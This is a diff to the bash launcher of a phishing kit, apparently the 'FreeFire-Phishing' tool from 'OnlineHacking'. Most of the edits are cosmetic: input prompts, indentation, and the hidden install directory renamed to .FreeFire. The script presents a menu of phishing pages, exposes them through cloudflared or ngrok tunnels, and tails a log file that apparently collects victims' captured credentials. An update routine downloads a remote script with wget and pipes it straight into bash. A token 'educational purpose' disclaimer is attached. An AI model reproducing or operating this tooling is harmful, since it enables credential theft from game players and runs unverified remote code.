@@ -70,7 +70,7 @@ echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"   
 echo " "
 
-read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[92m You Want to Choose Phishing Link Services Option : \e[97m ' portfrd
+read -n1 -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[92m You Want to Choose Phishing Link Services Option : \e[97m ' portfrd
 if [[ $portfrd == "1" || $portfrd == "01" || $portfrd == "cloudflare" ]]; then
 echo ""
 start_cloudflared
@@ -366,7 +366,7 @@ echo -e ""
 
 function askuri_c() {
 echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+read -n1 -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
 echo""
 echo""
 echo""
@@ -389,7 +389,7 @@ echo ""
 
 function askuri_nc() {
 echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+read -n1 -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
 echo""
 echo""
 echo""
@@ -412,7 +412,7 @@ echo ""
 
 function askuri_l() {
 echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+read -n1 -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
 echo""
 echo""
 echo""
@@ -592,7 +592,7 @@ Online Hacking © \e[92m
 
 
 cd_home() {
-cd /usr/bin/.SUMAN/
+cd /usr/bin/.FreeFire/
 }
 
 
@@ -832,7 +832,7 @@ echo -e "\e[93m
 \e[0m\n"
 echo ""
 echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
+read -n1 -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
 echo""
 echo""
 echo""
@@ -993,7 +993,7 @@ tput cnorm
 printf "\e[1;92m [ Done ]\e[0m";
 echo "";
 }
-
+############################################################################################################################################################
 check_update () {
 echo ""
 echo -ne "\e[33m Chack Lates Version : " && rm -rf ChackVersion-2.8 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/ChackVersion-2.8 > /dev/null && bash ChackVersion-2.8 && rm -rf ChackVersion-2.8
@@ -1004,7 +1004,7 @@ echo -ne "\e[33m Admin Permission : " && rm -rf admin && wget -q https://github.
 echo ""
 sleep 1
 }
-
+##################################################################################################
 clear
 echo ""
 echo ""
@@ -1029,7 +1029,7 @@ echo ""
 printf "\e[31m[\e[32m★\e[31m]\e[93m This Tool is only educational purpose and we are not responsible for kind of illegal activity done by this tool\e[m "
 echo ""
 echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[96m Accepted This Notice \e[1;91m (Y/N) : \e[0m' option
+read -n1 -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[96m Accepted This Notice \e[1;91m (Y/N) : \e[0m' option
 echo""
 echo""
 echo""
@@ -1058,6 +1058,7 @@ logo1
 logo_text
 echo ""
                  echo -e $''   
+                 cd .FreeFire/
                  read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m  You Want to Choose Phishing Option  \e[1;91m  > : \e[0m' option
                  echo ""
 		 
@@ -1135,14 +1136,14 @@ echo ""
                            echo ""
                            echo ""
                            tail -f OnlineHacking.txt
-                  msg_exit
+                           msg_exit
                
 	       
 	       
                   
-                break;
-                elif [ $option = 05 ] || [ $option = 5 ]
-	        then 
+                 break;
+                 elif [ $option = 05 ] || [ $option = 5 ]
+	         then 
                            cd_home
                            cd 6/
                            echo ""
@@ -1155,7 +1156,7 @@ echo ""
                            echo ""
                            echo ""
                            tail -f OnlineHacking.txt
-                  msg_exit
+                           msg_exit
 		  
                  break;
                  elif [ $option = 06 ] || [ $option = 6 ]
@@ -1167,17 +1168,17 @@ echo ""
 			   server
 			   select_url
                            
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > log.txt
-                           fi 
+                        #    if [[ -e OnlineHacking.txt ]]; then
+                        #    > OnlineHacking.txt
+                        #    fi 
                            echo ""
                            echo ""
                            tail -f OnlineHacking.txt 
-                  msg_exit
+                           msg_exit
 		  
-                break;
-   elif [ $option = 07 ] || [ $option = 7 ]
-	          then
+                 break;
+                 elif [ $option = 07 ] || [ $option = 7 ]
+	         then
 	                   cd_home
                            cd 9/         
                            echo ""
@@ -1190,11 +1191,11 @@ echo ""
                            echo ""
                            echo ""
                            tail -f OnlineHacking.txt
-msg_exit
+                           msg_exit
 
-                  break;
-    elif [ $option = 08 ] || [ $option = 8 ]
-	          then
+                 break;
+                 elif [ $option = 08 ] || [ $option = 8 ]
+	         then
 	                   cd_home
                            cd 8/         
                            echo ""
@@ -1207,12 +1208,12 @@ msg_exit
                            echo ""
                            echo ""
                            tail -f OnlineHacking.txt
-msg_exit
+                           msg_exit
 
-                  break;   
+                 break;   
 		  
-elif [ $option = 09 ] || [ $option = 9 ]
-	          then
+                 elif [ $option = 09 ] || [ $option = 9 ]
+	         then
 	                   cd_home
                            cd 5/         
                            echo ""
@@ -1225,11 +1226,11 @@ elif [ $option = 09 ] || [ $option = 9 ]
                            echo ""
                            echo ""
                            tail -f OnlineHacking.txt
-msg_exit
+                           msg_exit
 
-                  break;		  
-elif [ $option = 10 ] || [ $option = 010 ]
-	          then
+                 break;		  
+                 elif [ $option = 10 ] || [ $option = 010 ]
+	         then
 	                   cd_home
                            cd 1/     
                            echo ""
@@ -1242,29 +1243,29 @@ elif [ $option = 10 ] || [ $option = 010 ]
                            echo ""
                            echo ""
                            tail -f OnlineHacking.txt
-msg_exit
+                           msg_exit
 
-                  break;		  
-elif [ $option = 50 ] || [ $option = 050 ]
-	          then
+                 break;		  
+                 elif [ $option = 50 ] || [ $option = 050 ]
+	         then
 
                            echo ""
 			   l_logo
 			   echo ""
 	         
 
-                 echo ""
+                            echo ""
 	
 	
 			   
 
-                  break;		  
+                 break;		  
 
-                elif [ $option = 99 ]
-	        then     
+                 elif [ $option = 99 ]
+	         then     
 	                 echo
        	                 exit 
-		break;
+		 break;
 		      
                 else 
 		  
